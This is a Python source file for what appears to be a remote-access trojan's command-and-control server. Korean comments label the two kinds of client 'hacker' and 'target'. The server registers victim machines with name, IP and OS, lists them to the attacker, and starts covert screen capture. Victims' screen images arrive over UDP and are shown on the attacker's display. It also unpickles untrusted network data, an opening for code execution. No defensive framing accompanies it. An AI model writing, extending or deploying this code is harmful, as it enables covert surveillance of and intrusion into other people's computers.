import numpy as np
from socketio import Server, WSGIApp
import socket
import struct
import pickle
import cv2

sio = Server()
app = WSGIApp(sio)

targets = []

@sio.event
def connect(sid, environ, auth):
  print('connect ', sid)
  sio.emit('info', room=sid)

@sio.event
def disconnect(sid):
  global targets
  print('disconnect ', sid)
  for i, v in enumerate(targets):
    if v['sid'] == sid:
      targets.pop(i)
      sio.emit('del target', {'sid': sid})
      break


# 해커로부터 오는 요청
@sio.on('target list')
def getTargetList(sid):
  sio.emit('t list', {'targets': targets}, room=sid)

@sio.on('remote req')
def remoteReq(sid, data):
  sio.emit('remote start', room=data['target'])

  s=socket.socket(socket.AF_INET , socket.SOCK_DGRAM)
  ip=""
  port=8001
  s.bind((ip,port))
  while True:
    x=s.recvfrom(1000000)
    clientip = x[1][0]
    screenData=x[0]
    screenData=pickle.loads(screenData)
    screenData = cv2.imdecode(screenData, cv2.IMREAD_COLOR)
    cv2.imshow('server', screenData)
    if cv2.waitKey(10) == 27:
      sio.emit('stop remote', room=data['target'])
      break
  cv2.destroyAllWindows()


# 타겟으로부터 오는 요청
@sio.on('my info')
def setTargetInfo(sid, data):
  targets.append({
    'name': data['name'],
    'ip': data['ip'],
    'os': data['os'],
    'sid': sid
  })
  print(targets)

@sio.on('stream monitor')
def stream(sid, data):
  sio.emit('stream', {'src': data['src']}, room=data['hacker'])